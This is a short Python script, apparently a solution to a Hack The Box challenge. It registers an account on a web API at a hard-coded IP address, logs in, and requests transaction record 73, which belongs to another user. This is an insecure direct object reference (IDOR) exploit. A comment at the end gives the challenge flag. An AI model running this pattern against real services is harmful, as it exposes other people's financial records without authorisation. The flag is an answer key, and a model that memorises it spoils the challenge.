import requests
s = requests.session()
username = input('username:  ')
s.post('http://46.101.8.93:32211/api/register',json={'username':username, 'password':'hello', 'email':'hello@gmail.com'})
s.post('http://46.101.8.93:32211/api/login',json={'username':username, 'password':'hello'})
print(s.get('http://46.101.8.93:32211/api/transactions/73').text)
#HTB{Id0rs_f0r_Br34kfa57}